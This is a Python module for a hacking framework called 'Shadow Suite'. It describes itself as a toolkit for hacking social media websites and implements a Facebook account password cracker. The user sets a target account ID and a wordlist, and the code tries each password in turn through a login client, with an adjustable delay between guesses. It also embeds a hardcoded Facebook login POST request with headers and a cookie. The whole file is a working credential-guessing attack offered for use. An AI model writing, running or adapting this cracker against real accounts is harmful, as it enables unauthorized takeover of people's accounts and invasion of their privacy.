########################################################################################
#                                                                                      #
#                       MODULE FOR SHADOW SUITE LINUX EDITION                          #
#                                                                                      #
########################################################################################
# Coding=UTF-8

# Module version: 5.1

# Import directives
try:
    import os
    import sys
    import traceback
    from core import error
    from core.logger import log
    import API

    # Place your 'import' directives below
    import time
    import ssl
    import requests
    from modules.SMT import fbchat

    import_error = False

except ImportError:
    print("[!] A module is missing! Please install the required modules...")
    print("==================== TRACEBACK ====================")
    traceback.print_exc()
    print("===================================================")
    import_error = True

# Put your module information here.
info = {
        "name": "Social Media Toolkit (SMT)", # Module filename (Change this; I recommend you to use the filename as the module name.)
        "version": "1.0", # version
        "author": "Catayao56", # Author
        "desc": "A suite of tools for hacking social media websites.", # Brief description
        "email": "Catayao56@gmail.com", # Email
        "authorinfo": "https://github.com/Catayao56/", # Additional information about the author; this could be
        "lastupdate": "May 03, 2018",                     # a website of the author.
        # The date format is MONTH, DD, YYYY e.g.: Jan. 4, 2018
        "usingapi": "True", # Is this module using Shadow Suite's API?
        "needsroot": "1", # Does this module needs root permissions?
                                          # 0 == True; any number means false.
}
dependencies = ['none'] # Put needed dependencies here.  

# Changelog of the module
changelog = "Version 1.0:\nInitial module release"
# Changelog format:
#
# changelog = "Version 2.0:\nUpdate Description\n\nVersion1.0\nInitial module release"

# Prints the module information
def module_info():
    # Unofficial way to convert integer to Boolean
    # (well, not really a boolean, as it is a string).
    # if [argument] == 0 then True; Otherwise, False.
    if info['needsroot'] == "0":
        superm = "True"
    else:
        superm = "False"

    print("Module Name: " + info['name'])
    print("Module Version: " + info['version'])
    print("Module Author: " + info['author'])
    print("Module Description: " + info['desc'])
    print()
    print("Module Author's Email: " + info['email'])
    print("Module Author's Info: " + info['authorinfo'])
    print("Module's last update: " + info['lastupdate'])
    print("Shadow Suite API Support: " + info['usingapi'])
    print("Needs root: " + superm)
    print()
    # Prints the dependencies via for loop. I just copy/pasted it from a reference book
    # and modified it XD
    print("Dependencies:", end=' ')
    for item in dependencies:
        print(item, ",", end=' ')
    print()
    # Prints the changelog of the module.
    print("Changelog:\n" + "\n" + changelog)
    print("\n\n")

# Main module function
def main():
    if import_error is True:
        return None

    else:
        """ First, it checks the value assigned to the 'needsroot' variable in the 
        dictionary 'info', then if the value is equal to zero, it calls the 'geteuid()'
        function from the 'os' module. If the result from geteuid is also zero, then
        the module will call the function 'module_body()'. Otherwise, it will print an
        error message. If the value assigned to the 'needsroot' variable in the dictionary
        'info' is not equal to zero, then the module will not call the 'geteuid()' function
        from the 'os' module, and will immediately call 'module_body()' function. """
        if info['needsroot'] == "0":
            if os.geteuid() != 0:
                print(error.ERROR0005)
                return 0

            else:
                module_body()

        else:
            module_body()

class Facebook_Attack:
    banner = r"""
      _______  __    __  _____  ___  ___  _    _ _   _____  _____
     / _____/ |  \  /  ||__ __|/   \/   \| |  | | /  |. .| |__ __|
     \_____ \ | |\\/ / |  | |  | | || | || |_ |   \  .| |.   | |
      ______/ |_| \_/|_|  |_|  \___/\___/|___||_|\_\ |___|   |_|
                     Facebook Account Cracker
    """
    target_id = "N/A"
    wordlist_path = "N/A"
    proxy_host = "127.0.0.1"
    proxy_port = 80
    delay = 0.5

    a = "POST /login.php HTTP/1.1"
    b = "Host: www.facebook.com"
    c = "Connection: close"
    e = "Cache-Control: max-age=0"
    f = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    g = "Origin: https://www.facebook.com"
    h = "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31"
    i = "Content-Type: application/x-www-form-urlencoded"
    j = "Accept-Encoding: gzip,deflate,sdch"
    k = "Accept-Language: en-US,en;q=0.8"
    l = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3"
    cookie = "cookie: datr=80ZzUfKqDOjwL8pauwqMjHTa"
    post = "lsd=AVpD2t1f&display=&enable_profile_selector=&legacy_return=1&next=&profile_selector_ids=&trynum=1&timezone=300&lgnrnd=031110_Euoh&lgnjs=1366193470&email=$user&pass=$password&default_persistent=0&login=Log+In"
    cl = len(post)
    d = "Content-Length: " + str(cl)
    host, port = "www.facebook.com", 443

    word = ""

    def execute(self):
        API.misc.programFunctions().clrscrn()
        print(self.banner)
        print()
        print("[i] Attack on ID '" + self.target_id + "' started on " + time.asctime())
        print()
        print("[i] Reading wordlist...")
        try:
            open(self.wordlist_path, 'r').read()
            open(self.wordlist_path, 'r').close()

        except FileNotFoundError:
            print("[i] Wordlist file not found! Please check the wordlist path.")
            API.misc.programFunctions().pause()
            return 0

        with open(self.wordlist_path, 'r') as fopen:
            wordlist = fopen.readlines()
            while True:
                try:
                    for words in wordlist:
                        words = words.replace("\n", "")
                        self.word = words
                        print("Current Password: " + self.word)
                        cracked, c_url = fbchat.Client(self.target_id, self.word)._login()
                        if cracked == True:
                            print("[i] Password cracked!\tPassword: " + self.word)
                            print(c_url)
                            API.misc.programFunctions().pause()
                            break

                        else:
                            continue

                        time.sleep(self.delay)

                    print("[i] Password not cracked... Password not in wordlist.")
                    API.misc.programFunctions().pause()
                    break

                except KeyboardInterrupt:
                    print(error.ERROR0002)
                    API.misc.programFunctions().pause()
                    break

                except fbchat.client.FBchatUserError:
                    print("[i] Target ID and/or wordlist not set!")
                    API.misc.programFunctions().pause()
                    break

                except ImportError:
                    print("[i] An unknown error occured... Please contact the author/s for help or create a pull request on GitHub.")
                    API.misc.programFunctions().pause()
                    break

                except ValueError as e:
                    print(e)

    def main(self):
        while True:
            try:
                API.misc.programFunctions().clrscrn()
                print(self.banner)
                print()
                print("[i] Configure settings:")
                print()
                print("Current Settings:")
                print("\tTarget ID       :: " + str(self.target_id))
                print("\tWordlist        :: " + str(self.wordlist_path))
                print("\tProxy Host      :: " + str(self.proxy_host))
                print("\tProxy Port      :: " + str(self.proxy_port))
                print("\tDelay per Guess :: " + str(self.delay))
                print()
                print("[i] Proxy usage is not yet supported!")
                print()
                print("(01) Set Target ID")
                print("(02) Set Wordlist")
                print("(03) Set Proxy Host")
                print("(04) Set Proxy Port")
                print("(05) Set Delay per Guess")
                print()
                print("(98) Execute Attack")
                print("(99) Abort Attack")
                print()
                action = int(input("[SMTOOLKI]: "))
                if action == 1:
                    self.target_id = str(input("[SMTOOLKIT]: Target ID: "))

                elif action == 2:
                    self.wordlist_path = str(input("[SMTOOLKIT]: Wordlist Path: "))

                elif action == 3:
                    self.proxy_host = str(input("[SMTOOLKIT]: Proxy Host: "))

                elif action == 4:
                    self.proxy_port = int(input("[SMTOOLKIT]: Proxy Port: "))

                elif action == 5:
                    self.delay = float(input("[SMTOOLKIT]: Delay per Guess: "))

                elif action == 98:
                    self.execute()
                    continue

                elif action == 99:
                    return 0

                else:
                    pass

            except KeyboardInterrupt:
                print(error.ERROR0002)
                API.misc.programFunctions().pause()
                return 0

            except(ValueError, TypeError):
                print("[i] Wrong input!")
                API.misc.programFunctions().pause()

def module_body():
    banner = r"""
      _______  __    __  _____  ___  ___  _    _ _   _____  _____
     / _____/ |  \  /  ||__ __|/   \/   \| |  | | /  |. .| |__ __|
     \_____ \ | |\\/ / |  | |  | | || | || |_ |   \  .| |.   | |
      ______/ |_| \_/|_|  |_|  \___/\___/|___||_|\_\ |___|   |_|
    """
    while True:
        API.misc.programFunctions().clrscrn()
        print(banner)
        print()
        print("[i] Select Website to attack:")
        print()
        print("(01) Facebook")
        print("(02) Twitter")
        print("(03) Instagram")
        print("(04) Google+")
        print("(05) LinkedIn")
        print("(06) Stack Overflow")
        print()
        print("(99) Quit")
        print()
        try:
            target_website = int(input("[SMTOOLKIT]: "))

            if target_website == 1:
                Facebook_Attack().main()

            elif target_website == 99:
                print()
                print(API.ShadowSuiteLE().FINISH)
                API.misc.programFunctions().pause()
                return None

            else:
                print(error.ERROR0001)
                API.misc.programFunctions().pause()

        except KeyboardInterrupt:
            print(error.ERROR0002)
            API.misc.programFunctions().pause()
            return 0

        except(TypeError, ValueError):
            print(error.ERROR0001)
            API.misc.programFunctions().pause()
            continue
